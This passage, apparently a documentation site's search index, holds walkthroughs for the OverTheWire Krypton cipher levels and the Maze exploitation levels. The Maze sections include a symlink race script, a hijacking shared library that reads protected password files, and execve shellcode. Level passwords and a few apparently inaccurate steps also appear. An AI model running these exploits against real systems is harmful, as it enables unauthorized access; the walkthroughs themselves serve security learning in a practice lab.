/tmp/cipher2.txt</code></p> <p>Compare differences to isolate the XOR pattern.</p> </li> <li> <p>XOR the known ciphertext with the observed keystream to recover the plaintext:</p> <p>```python cipher = \"PNUKLYLWRQKGKBE\" key    = \"EICTDGYIYZKTHNS\"  # Extracted from encrypting 'A'*30</p> <p>for i in range(len(cipher)):     k = ord(cipher[i]) - ord(key[i])     if k &lt; 0: k += 26     k += ord('A')     print(chr(k), end='') ```</p> <p>Output:</p> <p><code>LFSRISNOTRANDOM</code></p> </li> <li> <p>Logout:</p> <p><code>bash exit</code></p> </li> </ol>"},{"location":"Over%20The%20Wire/Krypton/%F0%9F%A7%A0%20Krypton%20Level%206%20%E2%86%92%20Level%207/#password-for-krypton-level-7","title":"\ud83d\udddd\ufe0f Password for Krypton Level 7:","text":"<pre><code>LFSRISNOTRANDOM\n</code></pre>"},{"location":"Over%20The%20Wire/Krypton/%F0%9F%A7%AA%20Krypton%20Level%200%20%E2%86%92%20Level%201/","title":"Level 0 \u2192 1","text":"<p>Challenge URL: Krypton Level 0</p>"},{"location":"Over%20The%20Wire/Krypton/%F0%9F%A7%AA%20Krypton%20Level%200%20%E2%86%92%20Level%201/#level-goal","title":"\ud83c\udfaf Level Goal:","text":"<p>Log into <code>krypton1</code> using SSH. The password is stored in a file called <code>level0</code>, which is base64 encoded.</p>"},{"location":"Over%20The%20Wire/Krypton/%F0%9F%A7%AA%20Krypton%20Level%200%20%E2%86%92%20Level%201/#concept","title":"\ud83d\udcd8 Concept:","text":"<p>In this level, you'll get hands-on with:</p> <ul> <li> <p>Basic SSH authentication</p> </li> <li> <p>Reading file contents with <code>cat</code></p> </li> <li> <p>Decoding base64-encoded strings using CLI tools</p> </li> </ul>"},{"location":"Over%20The%20Wire/Krypton/%F0%9F%A7%AA%20Krypton%20Level%200%20%E2%86%92%20Level%201/#steps-to-solve","title":"\ud83d\udd27 Steps to Solve:","text":"<ol> <li> <p>SSH into Krypton Level 1:</p> <p><code>bash ssh krypton1@krypton.labs.overthewire.org -p 2222</code></p> <p>Password: Provided externally or captured from earlier</p> </li> <li> <p>View the base64 encoded file:</p> <p><code>bash cat level0</code></p> <p>Output:</p> <p><code>S1JZUFRPTklTR1JFQVQ=</code></p> </li> <li> <p>Decode using base64:</p> <p><code>bash echo \"S1JZUFRPTklTR1JFQVQ=\" | base64 -d</code></p> <p>Output:</p> <p><code>KRYPTONISGREAT</code></p> </li> <li> <p>Logout:</p> <p><code>bash exit</code></p> </li> </ol>"},{"location":"Over%20The%20Wire/Krypton/%F0%9F%A7%AA%20Krypton%20Level%200%20%E2%86%92%20Level%201/#password-for-krypton-level-1","title":"\ud83d\udddd\ufe0f Password for Krypton Level 1:","text":"<pre><code>KRYPTONISGREAT\n</code></pre>"},{"location":"Over%20The%20Wire/Krypton/%F0%9F%A7%AC%20Krypton%20Level%201%20%E2%86%92%20Level%202/","title":"Level 1 \u2192 2","text":"<p>Challenge URL: Krypton Level 1</p>"},{"location":"Over%20The%20Wire/Krypton/%F0%9F%A7%AC%20Krypton%20Level%201%20%E2%86%92%20Level%202/#level-goal","title":"\ud83c\udfaf Level Goal:","text":"<p>Find the password for <code>krypton2</code>. It is located in the file <code>/krypton/krypton1/krypton2</code> and encrypted using a rotation cipher (ROT13).</p>"},{"location":"Over%20The%20Wire/Krypton/%F0%9F%A7%AC%20Krypton%20Level%201%20%E2%86%92%20Level%202/#concept","title":"\ud83e\udde0 Concept:","text":"<p>This level demonstrates:</p> <ul> <li> <p>Reading files from another path</p> </li> <li> <p>Using ROT13 substitution ciphers</p> </li> <li> <p>Simple character translation in shell</p> </li> </ul>"},{"location":"Over%20The%20Wire/Krypton/%F0%9F%A7%AC%20Krypton%20Level%201%20%E2%86%92%20Level%202/#steps-to-solve","title":"\ud83d\udee0\ufe0f Steps to Solve:","text":"<ol> <li> <p>SSH into Krypton Level 1:</p> <p><code>bash ssh krypton1@krypton.labs.overthewire.org -p 2222</code></p> <p>Password: <code>KRYPTONISGREAT</code></p> </li> <li> <p>Display the encrypted file:</p> <p><code>bash cat /krypton/krypton1/krypton2</code></p> <p>Output:</p> <p><code>YRIRY GJB CNFFJBEQ EBGGRA</code></p> </li> <li> <p>Use the <code>tr</code> command for ROT13 decryption:</p> <p><code>bash echo \"YRIRY GJB CNFFJBEQ EBGGRA\" | tr 'A-Za-z' 'N-ZA-Mn-za-m'</code></p> <p>Output:</p> <p><code>LEVEL TWO PASSWORD ROTTEN</code></p> </li> <li> <p>Logout after completion:</p> <p><code>bash exit</code></p> </li> </ol>"},{"location":"Over%20The%20Wire/Krypton/%F0%9F%A7%AC%20Krypton%20Level%201%20%E2%86%92%20Level%202/#password-for-krypton-level-2","title":"\ud83d\udddd\ufe0f Password for Krypton Level 2:","text":"<pre><code>ROTTEN\n</code></pre>"},{"location":"Over%20The%20Wire/Krypton/%F0%9F%A7%AE%20Krypton%20Level%204%20%E2%86%92%20Level%205/","title":"Level 4 \u2192 5","text":"<p>Challenge URL: Krypton Level 4</p>"},{"location":"Over%20The%20Wire/Krypton/%F0%9F%A7%AE%20Krypton%20Level%204%20%E2%86%92%20Level%205/#level-goal","title":"\ud83c\udfaf Level Goal:","text":"<p>The password for <code>krypton5</code> is stored in a file named <code>krypton5</code>. It was encrypted using a Vigen\u00e8re cipher with a known key length of 6, and you are given two reference plaintexts (<code>found1</code>, <code>found2</code>) to help derive the key.</p>"},{"location":"Over%20The%20Wire/Krypton/%F0%9F%A7%AE%20Krypton%20Level%204%20%E2%86%92%20Level%205/#concept","title":"\ud83e\udde0 Concept:","text":"<p>This challenge focuses on:</p> <ul> <li> <p>Understanding polyalphabetic substitution ciphers</p> </li> <li> <p>Cracking Vigen\u00e8re ciphers</p> </li> <li> <p>Using frequency analysis on repeated intervals</p> </li> </ul>"},{"location":"Over%20The%20Wire/Krypton/%F0%9F%A7%AE%20Krypton%20Level%204%20%E2%86%92%20Level%205/#steps-to-solve","title":"\ud83d\udee0\ufe0f Steps to Solve:","text":"<ol> <li> <p>SSH into Krypton Level 4:</p> <p><code>bash ssh krypton4@krypton.labs.overthewire.org -p 2222</code></p> <p>Password: <code>BRUTE</code></p> </li> <li> <p>Navigate to the correct directory and list files:</p> <p><code>bash cd /krypton/krypton4/ ls</code></p> <p>You\u2019ll see:</p> <p><code>HINT  README  found1  found2  krypton5</code></p> </li> <li> <p>Read the encrypted file:</p> <p><code>bash cat krypton5</code></p> <p>Output:</p> <p><code>HCIKV RJOX</code></p> </li> <li> <p>Use frequency analysis to find the key:</p> <p>Since key length is 6, we split the ciphertext into 6 separate columns and analyze each as a Caesar cipher:</p> <p>A Python approach was used to analyze each position's frequency and match it with English frequency norms.</p> <p>After decoding and verifying through mapping:</p> <p>\u2705 Derived key: <code>FREKEY</code></p> </li> <li> <p>Decrypt the final ciphertext using the derived key with a Vigen\u00e8re decoder.</p> <p>Output:</p> <p><code>CLEARTEXT</code></p> </li> <li> <p>Logout after completing:</p> <p><code>bash exit</code></p> </li> </ol>"},{"location":"Over%20The%20Wire/Krypton/%F0%9F%A7%AE%20Krypton%20Level%204%20%E2%86%92%20Level%205/#password-for-krypton-level-5","title":"\ud83d\udddd\ufe0f Password for Krypton Level 5:","text":"<pre><code>CLEARTEXT\n</code></pre>"},{"location":"Over%20The%20Wire/Krypton/%F0%9F%A7%B7%20Krypton%20Level%205%20%E2%86%92%20Level%206/","title":"Level 5 \u2192 6","text":"<p>Challenge URL: Krypton Level 5</p>"},{"location":"Over%20The%20Wire/Krypton/%F0%9F%A7%B7%20Krypton%20Level%205%20%E2%86%92%20Level%206/#level-goal","title":"\ud83c\udfaf Level Goal:","text":"<p>The password for <code>krypton6</code> is encrypted with a Vigen\u00e8re cipher, just like the previous level. This time, however, the key length is unknown, and your job is to deduce it before decrypting the message.</p>"},{"location":"Over%20The%20Wire/Krypton/%F0%9F%A7%B7%20Krypton%20Level%205%20%E2%86%92%20Level%206/#concept","title":"\ud83e\udde0 Concept:","text":"<p>This level introduces:</p> <ul> <li> <p>Key-length detection in Vigen\u00e8re ciphers</p> </li> <li> <p>Trial-and-error for Caesar shift alignment</p> </li> <li> <p>Leveraging intuition and repetition to validate plaintext</p> </li> </ul>"},{"location":"Over%20The%20Wire/Krypton/%F0%9F%A7%B7%20Krypton%20Level%205%20%E2%86%92%20Level%206/#steps-to-solve","title":"\ud83d\udee0\ufe0f Steps to Solve:","text":"<ol> <li> <p>SSH into Krypton Level 5:</p> <p><code>bash ssh krypton5@krypton.labs.overthewire.org -p 2222</code></p> <p>Password: <code>CLEARTEXT</code></p> </li> <li> <p>Navigate to the challenge directory:</p> <p><code>bash cd /krypton/krypton5/ ls</code></p> <p>Files available:</p> <p><code>README  found1  found2  found3  krypton6</code></p> </li> <li> <p>Read the encrypted password file:</p> <p><code>bash cat krypton6</code></p> <p>Output:</p> <p><code>BELOS Z</code></p> </li> <li> <p>Try different key lengths and analyze shifts:</p> <p>Reuse the script from Level 4 and adjust the key length until a readable plaintext appears.</p> <p>Eventually, the output:</p> <p><code>RANDOM</code></p> <p>was found when the guessed key was:</p> <p><code>KEYLENGTH</code></p> <p>(A clever pun by the challenge author \ud83d\udc40)</p> </li> <li> <p>Logout:</p> <p><code>bash exit</code></p> </li> </ol>"},{"location":"Over%20The%20Wire/Krypton/%F0%9F%A7%B7%20Krypton%20Level%205%20%E2%86%92%20Level%206/#password-for-krypton-level-6","title":"\ud83d\udddd\ufe0f Password for Krypton Level 6:","text":"<pre><code>RANDOM\n</code></pre>"},{"location":"Over%20The%20Wire/Krypton/%F0%9F%A7%BE%20Krypton%20Level%203%20%E2%86%92%20Level%204/","title":"Level 3 \u2192 4","text":"<p>Challenge URL: Krypton Level 3</p>"},{"location":"Over%20The%20Wire/Krypton/%F0%9F%A7%BE%20Krypton%20Level%203%20%E2%86%92%20Level%204/#level-goal","title":"\ud83c\udfaf Level Goal:","text":"<p>The password for <code>krypton4</code> is hidden inside an encrypted file using a monoalphabetic substitution cipher. You are also provided with 3 plaintext clue files that were encrypted using the same cipher key.</p>"},{"location":"Over%20The%20Wire/Krypton/%F0%9F%A7%BE%20Krypton%20Level%203%20%E2%86%92%20Level%204/#concept","title":"\ud83e\udde0 Concept:","text":"<p>In this level, you\u2019ll work with:</p> <ul> <li> <p>Frequency analysis of ciphered letters</p> </li> <li> <p>Decrypting monoalphabetic substitution ciphers</p> </li> <li> <p>Pattern recognition across multiple files</p> </li> </ul>"},{"location":"Over%20The%20Wire/Krypton/%F0%9F%A7%BE%20Krypton%20Level%203%20%E2%86%92%20Level%204/#steps-to-solve","title":"\ud83d\udee0\ufe0f Steps to Solve:","text":"<ol> <li> <p>SSH into Krypton Level 3:</p> <p><code>bash ssh krypton3@krypton.labs.overthewire.org -p 2222</code></p> <p>Password: <code>CAESARISEASY</code></p> </li> <li> <p>Navigate to the challenge directory:</p> <p><code>bash cd /krypton/krypton3/ ls</code></p> <p>Files present:</p> <p><code>HINT1  HINT2  README  found1  found2  found3  krypton4</code></p> </li> <li> <p>View the encrypted password file:</p> <p><code>bash cat krypton4</code></p> <p>Output:</p> <p><code>KSVVW BGSJD SVSIS VXBMN YQUUK BNWCU ANMJS</code></p> </li> <li> <p>Combine and analyze frequency of known ciphertext samples:</p> <p><code>bash cat found1 found2 found3 | tr -d ' ' | fold -w1 | sort | uniq -c | sort -nr</code></p> <p>Result:</p> <p><code>(S, Q, J, U...) are most frequent letters</code></p> <p>Based on this and comparing with English letter frequency (<code>ETAOIN...</code>), we can start mapping likely substitutions.</p> </li> <li> <p>Use a Python script to apply the frequency-based mapping:</p> <p>```python cipher = \"KSVVWBGSJDSVSISVXBMNYQUUKBNWCUANMJS\" mapping_from = \"SQJUBNCGDZVWMYTXKELAFIOHRP\" mapping_to   = \"EQTSORINHCLDUPMFWGYBKVXQJZ\"</p> <p>cleartext = \"\" for c in cipher:     if c in mapping_from:         i = mapping_from.index(c)         cleartext += mapping_to[i]     else:         cleartext += c</p> <p>print(cleartext) ```</p> <p>Output:</p> <p><code>WELLDONETHELEVELFOURPASSWORDISBRUTE</code></p> </li> <li> <p>Logout once complete:</p> <p><code>bash exit</code></p> </li> </ol>"},{"location":"Over%20The%20Wire/Krypton/%F0%9F%A7%BE%20Krypton%20Level%203%20%E2%86%92%20Level%204/#password-for-krypton-level-4","title":"\ud83d\udddd\ufe0f Password for Krypton Level 4:","text":"<pre><code>BRUTE\n</code></pre>"},{"location":"Over%20The%20Wire/Maze/%F0%9F%8C%80%20Maze%20Level%200%20%E2%86%92%20Level%201/","title":"Level 0 \u2192 1","text":"<p>Challenge URL: Maze Wargame</p>"},{"location":"Over%20The%20Wire/Maze/%F0%9F%8C%80%20Maze%20Level%200%20%E2%86%92%20Level%201/#level-goal","title":"\ud83d\udd10 Level Goal:","text":"<p>The binary for this level attempts to read a file from a hardcoded path and print its content. However, it performs a permission check using <code>access()</code> before reading. Our goal is to bypass this check and read the actual password file using a race condition.</p>"},{"location":"Over%20The%20Wire/Maze/%F0%9F%8C%80%20Maze%20Level%200%20%E2%86%92%20Level%201/#concept-covered","title":"\ud83e\udde0 Concept Covered:","text":"<ul> <li> <p>\u23f1\ufe0f Race condition exploitation</p> </li> <li> <p>\ud83e\uddf5 Rapid symbolic link switching</p> </li> <li> <p>\ud83e\uddfe Understanding <code>access()</code>, <code>open()</code> sequence</p> </li> <li> <p>\ud83d\udcdc Script-based attack automation</p> </li> </ul>"},{"location":"Over%20The%20Wire/Maze/%F0%9F%8C%80%20Maze%20Level%200%20%E2%86%92%20Level%201/#exploit-breakdown","title":"\ud83d\udee0\ufe0f Exploit Breakdown:","text":""},{"location":"Over%20The%20Wire/Maze/%F0%9F%8C%80%20Maze%20Level%200%20%E2%86%92%20Level%201/#binary-analysis-pseudocode","title":"\ud83d\udd0d Binary Analysis (Pseudocode):","text":"<pre><code>int main() {\n    char buf[20];\n    memset(buf, 0, 20);\n\n    if (access(\"/tmp/128ecf542a35ac5270a87dc740918404\", R_OK) == 0) {\n        setresuid(geteuid(), geteuid(), geteuid());\n        int fd = open(\"/tmp/128ecf542a35ac5270a87dc740918404\", O_RDONLY);\n        if (fd &lt; 0) exit(-1);\n\n        read(fd, buf, 19);\n        write(1, buf, 19);\n    }\n    return 0;\n}\n</code></pre> <ul> <li> <p>The file to read is hardcoded as <code>/tmp/128ecf542a35ac5270a87dc740918404</code></p> </li> <li> <p><code>access()</code> checks permission \u2014 as the current user (maze0)</p> </li> <li> <p><code>open()</code> reads \u2014 as the effective user (maze1)</p> </li> <li> <p>Race condition window = between <code>access()</code> and <code>open()</code></p> </li> </ul>"},{"location":"Over%20The%20Wire/Maze/%F0%9F%8C%80%20Maze%20Level%200%20%E2%86%92%20Level%201/#strategy","title":"\ud83e\uddea Strategy","text":"<p>We use two scripts:</p> <ul> <li> <p>\ud83e\uddf5 One rapidly switches the symlink</p> </li> <li> <p>\ud83c\udfc3 One runs the vulnerable binary in a loop</p> </li> </ul>"},{"location":"Over%20The%20Wire/Maze/%F0%9F%8C%80%20Maze%20Level%200%20%E2%86%92%20Level%201/#exploit-scripts","title":"\u2699\ufe0f Exploit Scripts","text":""},{"location":"Over%20The%20Wire/Maze/%F0%9F%8C%80%20Maze%20Level%200%20%E2%86%92%20Level%201/#racesh-symlink-swapper","title":"\ud83d\udcdc <code>race.sh</code> (symlink swapper)","text":"<pre><code>#!/bin/bash\nwhile true; do\n    ln -sf /etc/maze_pass/maze0 /tmp/128ecf542a35ac5270a87dc740918404\n    ln -sf /etc/maze_pass/maze1 /tmp/128ecf542a35ac5270a87dc740918404\ndone\n</code></pre>"},{"location":"Over%20The%20Wire/Maze/%F0%9F%8C%80%20Maze%20Level%200%20%E2%86%92%20Level%201/#runnersh-binary-spammer","title":"\ud83c\udfc3 <code>runner.sh</code> (binary spammer)","text":"<pre><code>#!/bin/bash\nwhile true; do\n    /maze/maze0\ndone\n</code></pre>"},{"location":"Over%20The%20Wire/Maze/%F0%9F%8C%80%20Maze%20Level%200%20%E2%86%92%20Level%201/#execution-steps","title":"\u25b6\ufe0f Execution Steps","text":"<ol> <li> <p>Start the symlink switcher:</p> <p><code>bash chmod +x race.sh &amp;&amp; ./race.sh</code></p> </li> <li> <p>In another terminal, start the binary runner:</p> <p><code>bash chmod +x runner.sh &amp;&amp; ./runner.sh</code></p> </li> <li> <p>With some luck, the binary reads from <code>/etc/maze_pass/maze1</code> instead of <code>/maze_pass/maze0</code>.</p> </li> </ol>"},{"location":"Over%20The%20Wire/Maze/%F0%9F%8C%80%20Maze%20Level%200%20%E2%86%92%20Level%201/#password-for-maze-level-1","title":"\ud83d\udd11 Password for Maze Level 1:","text":"<pre><code>hashaachon\n</code></pre> <p>If the shell prints garbled content, rerun the scripts \u2014 timing is key! \ud83d\udd70\ufe0f</p>"},{"location":"Over%20The%20Wire/Maze/%F0%9F%8C%80%20Maze%20Level%201%20%E2%86%92%20Level%202/","title":"Level 1 \u2192 2","text":"<p>Challenge URL: Maze Wargame</p>"},{"location":"Over%20The%20Wire/Maze/%F0%9F%8C%80%20Maze%20Level%201%20%E2%86%92%20Level%202/#level-goal","title":"\ud83d\udd10 Level Goal:","text":"<p>The binary (<code>maze1</code>) refuses to run due to a missing custom library: <code>./libc.so.4</code>. Our goal is to create a malicious version of that library with a custom <code>puts()</code> function that reveals the password.</p>"},{"location":"Over%20The%20Wire/Maze/%F0%9F%8C%80%20Maze%20Level%201%20%E2%86%92%20Level%202/#concepts-covered","title":"\ud83e\udde0 Concepts Covered:","text":"<ul> <li> <p>\ud83d\udce6 Dynamic Library Injection (LD_PRELOAD)</p> </li> <li> <p>\ud83e\ude9d Function Hooking (<code>puts</code>)</p> </li> <li> <p>\ud83d\udcd6 File I/O to read protected password files</p> </li> <li> <p>\ud83d\udd17 Shared library creation</p> </li> </ul>"},{"location":"Over%20The%20Wire/Maze/%F0%9F%8C%80%20Maze%20Level%201%20%E2%86%92%20Level%202/#binary-behavior-summary","title":"\ud83d\udd0e Binary Behavior Summary","text":"<p>When executed, the binary prints:</p> <pre><code>./maze1: error while loading shared libraries: ./libc.so.4: cannot open shared object file: No such file or directory\n</code></pre> <p>After decompilation:</p> <pre><code>int main(void) {\n    puts(\"Hello World!\");\n    return 0;\n}\n</code></pre> <p>It just calls <code>puts()</code>. By hijacking <code>puts()</code> with our own function, we can execute any code \u2014 including reading the password from <code>/etc/maze_pass/maze2</code>.</p>"},{"location":"Over%20The%20Wire/Maze/%F0%9F%8C%80%20Maze%20Level%201%20%E2%86%92%20Level%202/#exploitation-steps","title":"\ud83e\uddea Exploitation Steps","text":"<p>We\u2019ll:</p> <ol> <li> <p>Write a custom <code>puts()</code> function in C</p> </li> <li> <p>Compile it into a shared object (<code>libc.so.4</code>)</p> </li> <li> <p>Use LD_PRELOAD to force the binary to use our custom version</p> </li> </ol>"},{"location":"Over%20The%20Wire/Maze/%F0%9F%8C%80%20Maze%20Level%201%20%E2%86%92%20Level%202/#exploit-code","title":"\u2699\ufe0f Exploit Code","text":""},{"location":"Over%20The%20Wire/Maze/%F0%9F%8C%80%20Maze%20Level%201%20%E2%86%92%20Level%202/#hookputsc-custom-puts-hook","title":"\ud83d\udcdc <code>hookputs.c</code> (custom <code>puts()</code> hook)","text":"<pre><code>#define _GNU_SOURCE\n#include &lt;stdio.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;dlfcn.h&gt;\n#include &lt;string.h&gt;\n\nint puts(const char *message) {\n    FILE *fp;\n    char buffer[30];\n    int result;\n\n    fp = fopen(\"/etc/maze_pass/maze2\", \"r\");\n    fread(buffer, sizeof(char), sizeof(buffer), fp);\n    fclose(fp);\n\n    printf(\"\ud83d\udcdc The password is: %s\\n\", buffer);\n\n    result = printf(\"\ud83d\udce3 Hooked output: %s\\n\", message);\n    return result;\n}\n</code></pre>"},{"location":"Over%20The%20Wire/Maze/%F0%9F%8C%80%20Maze%20Level%201%20%E2%86%92%20Level%202/#build-the-hook-library","title":"\ud83e\uddf1 Build the Hook Library","text":"<pre><code>gcc -m32 -fPIC -c hookputs.c\nld -shared -m elf_i386 -o libc.so.4 hookputs.o -ldl\n</code></pre> <ul> <li> <p><code>-m32</code>: ensures 32-bit compatibility</p> </li> <li> <p><code>-fPIC</code>: required for position-independent code</p> </li> <li> <p><code>-ldl</code>: links the dynamic loader</p> </li> </ul>"},{"location":"Over%20The%20Wire/Maze/%F0%9F%8C%80%20Maze%20Level%201%20%E2%86%92%20Level%202/#run-the-exploit","title":"\ud83d\ude80 Run the Exploit","text":"<pre><code>LD_PRELOAD=./libc.so.4 ./maze1\n</code></pre> <p>If successful, it will output:</p> <pre><code>\ud83d\udcdc The password is: fooghihahr\n\ud83d\udce3 Hooked output: Hello World!\n</code></pre>"},{"location":"Over%20The%20Wire/Maze/%F0%9F%8C%80%20Maze%20Level%201%20%E2%86%92%20Level%202/#password-for-maze-level-2","title":"\ud83d\udd11 Password for Maze Level 2:","text":"<pre><code>fooghihahr\n</code></pre>"},{"location":"Over%20The%20Wire/Maze/%F0%9F%8C%80%20Maze%20Level%202%20%E2%86%92%20Level%203/","title":"Level 2 \u2192 3","text":"<p>Challenge URL: Maze Wargame</p>"},{"location":"Over%20The%20Wire/Maze/%F0%9F%8C%80%20Maze%20Level%202%20%E2%86%92%20Level%203/#level-goal","title":"\ud83d\udd10 Level Goal:","text":"<p>The binary takes user input, copies it into an 8-byte buffer using <code>strncpy()</code>, and executes it as shellcode. However, since the input size is just 8 bytes, we need to bypass the length limitation to spawn a shell.</p>"},{"location":"Over%20The%20Wire/Maze/%F0%9F%8C%80%20Maze%20Level%202%20%E2%86%92%20Level%203/#concepts-covered","title":"\ud83e\udde0 Concepts Covered:","text":"<ul> <li> <p>\ud83d\udc1a Shellcode injection via environment variable</p> </li> <li> <p>\ud83d\udce6 Assembly to jump to environment memory</p> </li> <li> <p>\ud83d\udee0 <code>nasm</code>, <code>ld</code>, and <code>objdump</code> for shellcode crafting</p> </li> <li> <p>\ud83d\udca5 Stack execution and <code>execve</code> syscall</p> </li> </ul>"},{"location":"Over%20The%20Wire/Maze/%F0%9F%8C%80%20Maze%20Level%202%20%E2%86%92%20Level%203/#binary-behavior","title":"\ud83d\udd0e Binary Behavior","text":"<p>From decompiled logic:</p> <pre><code>char buf[8];\nstrncpy(buf, argv[1], 8);\n((void (*)())buf)();  // Executes buf as code\n</code></pre> <p>We can't fit a full <code>/bin/sh</code> shellcode in 8 bytes \u2014 so instead, we\u2019ll:</p> <p>Place the real shellcode in an environment variable and use the 8-byte buffer to jump to it.</p>"},{"location":"Over%20The%20Wire/Maze/%F0%9F%8C%80%20Maze%20Level%202%20%E2%86%92%20Level%203/#step-by-step-exploit","title":"\ud83e\udde8 Step-by-Step Exploit","text":""},{"location":"Over%20The%20Wire/Maze/%F0%9F%8C%80%20Maze%20Level%202%20%E2%86%92%20Level%203/#step-1-craft-shellcode-in-an-environment-variable","title":"\ud83e\uddec Step 1: Craft shellcode in an environment variable","text":"<pre><code>export SC=$(python3 -c 'print(\"\\x90\"*100 + \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\" \\\n\"\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x89\\xc1\\x89\\xc2\\xb0\\x0b\\xcd\\x80\\x31\\xc0\\x40\\xcd\\x80\")')\n</code></pre> <ul> <li> <p>NOP sled (<code>\\x90</code> x100) increases success rate</p> </li> <li> <p>Shellcode spawns a shell using <code>execve(\"/bin/sh\", ...)</code></p> </li> </ul>"},{"location":"Over%20The%20Wire/Maze/%F0%9F%8C%80%20Maze%20Level%202%20%E2%86%92%20Level%203/#step-2-write-a-small-assembly-stub-to-jmp-to-env-shellcode","title":"\ud83d\udd29 Step 2: Write a small assembly stub to <code>jmp</code> to env shellcode","text":"<p>File: <code>pwn.asm</code></p> <pre><code>section .text\n    global _start\n\n_start:\n    mov eax, 0xffffdf0c    ; Address of environment shellcode\n    jmp eax\n</code></pre> <p>\ud83d\udce6 Assemble and link:</p> <pre><code>nasm -f elf pwn.asm\nld -m elf_i386 -s -o pwn pwn.o\n</code></pre> <p>\ud83d\udcdc Extract machine code:</p> <pre><code>objdump -M intel -d pwn\n</code></pre> <p>You'll get something like:</p> <pre><code>b8 0c df ff ff    ; mov eax, 0xffffdf0c\nff e0             ; jmp eax\n</code></pre> <p>Hex shellcode:</p> <pre><code>\\xb8\\x0c\\xdf\\xff\\xff\\xff\\xe0\n</code></pre>"},{"location":"Over%20The%20Wire/Maze/%F0%9F%8C%80%20Maze%20Level%202%20%E2%86%92%20Level%203/#step-3-run-the-binary-with-jump-code","title":"\u25b6\ufe0f Step 3: Run the binary with jump code","text":"<pre><code>/maze/maze2 $(python3 -c 'print(\"\\xb8\\x0c\\xdf\\xff\\xff\\xff\\xe0\")')\n</code></pre> <p>This triggers the jump to our environment shellcode and spawns a shell.</p>"},{"location":"Over%20The%20Wire/Maze/%F0%9F%8C%80%20Maze%20Level%202%20%E2%86%92%20Level%203/#password-for-maze-level-3","title":"\ud83d\udd11 Password for Maze Level 3:","text":"<pre><code>beinguthok\n</code></pre>"},{"location":"Over%20The%20Wire/Maze/%F0%9F%8C%80%20Maze%20Level%203%20%E2%86%92%20Level%204/","title":"Level 3 \u2192 4","text":"<p>Challenge URL: Maze Wargame</p>"},{"location":"Over%20The%20Wire/Maze/%F0%9F%8C%80%20Maze%20Level%203%20%E2%86%92%20Level%204/#level-goal","title":"\ud83d\udd10 Level Goal:","text":"<p>The binary decrypts a hidden section of code using XOR and executes it. Our task is to analyze the decrypted payload and supply the correct input to spawn a shell.</p>"},{"location":"Over%20The%20Wire/Maze/%F0%9F%8C%80%20Maze%20Level%203%20%E2%86%92%20Level%204/#concepts-covered","title":"\ud83e\udde0 Concepts Covered:","text":"<ul> <li> <p>\ud83e\udde9 XOR-based self-modifying code</p> </li> <li> <p>\ud83e\udde0 Analyzing dynamic decryption loops</p> </li> <li> <p>\ud83e\ude9b Understanding in-memory code patching</p> </li> <li> <p>\ud83e\uddea Supplying magic values to unlock hidden functionality</p> </li> </ul>"},{"location":"Over%20The%20Wire/Maze/%F0%9F%8C%80%20Maze%20Level%203%20%E2%86%92%20Level%204/#binary-behavior-summary","title":"\ud83d\udd0d Binary Behavior Summary","text":"<p>From reverse engineering, the binary:</p> <ol> <li> <p>Loads a block of 44 bytes from section <code>d1</code> into memory</p> </li> <li> <p>XORs each byte with the constant <code>0x12345678</code></p> </li> <li> <p>Executes the newly patched code</p> </li> </ol> <p>This is a self-modifying program where XOR transforms junk bytes into a valid function.</p>"},{"location":"Over%20The%20Wire/Maze/%F0%9F%8C%80%20Maze%20Level%203%20%E2%86%92%20Level%204/#decompiled-logic-simplified","title":"\ud83d\udcdc Decompiled Logic (Simplified)","text":"<pre><code>for (int i = 0; i &lt; 44; ++i) {\n    decrypted[i] = encrypted[i] ^ 0x12345678;\n}\n((void (*)())decrypted)();\n</code></pre> <p>The decrypted block checks if:</p> <pre><code>argv[1] == 0x1337c0de\n</code></pre> <p>If true \u2192 it executes <code>/bin/sh</code></p> <p>If false \u2192 it exits</p>"},{"location":"Over%20The%20Wire/Maze/%F0%9F%8C%80%20Maze%20Level%203%20%E2%86%92%20Level%204/#exploitation","title":"\ud83d\udee0\ufe0f Exploitation","text":"<p>We don\u2019t need shellcode or environment injection \u2014 just pass the correct magic argument.</p>"},{"location":"Over%20The%20Wire/Maze/%F0%9F%8C%80%20Maze%20Level%203%20%E2%86%92%20Level%204/#exploit-command","title":"\u25b6\ufe0f Exploit Command","text":"<pre><code>/maze/maze3 $(python3 -c 'print(\"\\xde\\xc0\\x37\\x13\")')\n</code></pre> <p>Explanation:</p> <ul> <li> <p>Little-endian of <code>0x1337c0de</code> = <code>\\xde\\xc0\\x37\\x13</code></p> </li> <li> <p>The XOR-decrypted code compares this with your input</p> </li> </ul> <p>If correct, you instantly get a shell \ud83d\udc1a</p>"},{"location":"Over%20The%20Wire/Maze/%F0%9F%8C%80%20Maze%20Level%203%20%E2%86%92%20Level%204/#password-for-maze-level-4","title":"\ud83d\udd11 Password for Maze Level 4:","text":"<pre><code>deekaihiek\n</code></pre>"},{"location":"Over%20The%20Wire/Maze/%F0%9F%8C%80%20Maze%20Level%204%20%E2%86%92%20Level%205/","title":"Level 4 \u2192 5","text":"<p>Challenge URL: Maze Wargame</p>"},{"location":"Over%20The%20Wire/Maze/%F0%9F%8C%80%20Maze%20Level%204%20%E2%86%92%20Level%205/#level-goal","title":"\ud83d\udd10 Level Goal:","text":"<p>The binary accepts a file path as input, validates it based on ELF header and program header conditions, and then executes it if the checks pass. Your task is to craft a valid ELF file that passes these conditions and spawns a shell.</p>"},{"location":"Over%20The%20Wire/Maze/%F0%9F%8C%80%20Maze%20Level%204%20%E2%86%92%20Level%205/#concepts-covered","title":"\ud83e\udde0 Concepts Covered:","text":"<ul> <li> <p>\ud83d\udcdc ELF header manipulation</p> </li> <li> <p>\ud83d\udd0d Understanding <code>e_ident[]</code> and <code>p_paddr</code> fields</p> </li> <li> <p>\ud83e\udde0 Use of <code>stat</code>, <code>read</code>, and <code>lseek</code></p> </li> <li> <p>\ud83e\ude9d Custom shell script as an ELF-compatible file</p> </li> </ul>"},{"location":"Over%20The%20Wire/Maze/%F0%9F%8C%80%20Maze%20Level%204%20%E2%86%92%20Level%205/#summary-of-binary-logic","title":"\ud83d\udd0e Summary of Binary Logic","text":"<p>From decompiled code:</p> <pre><code>stat(argv[1], &amp;st);                // Check file size\nread(fd, &amp;ehdr, 52);               // Read ELF header\nlseek(fd, ehdr.e_phoff, SEEK_SET);\nread(fd, &amp;phdr, 32);               // Read program header\n\nif (phdr.p_paddr == e_ident[8] * e_ident[7] &amp;&amp; st.st_size &lt; 120)\n    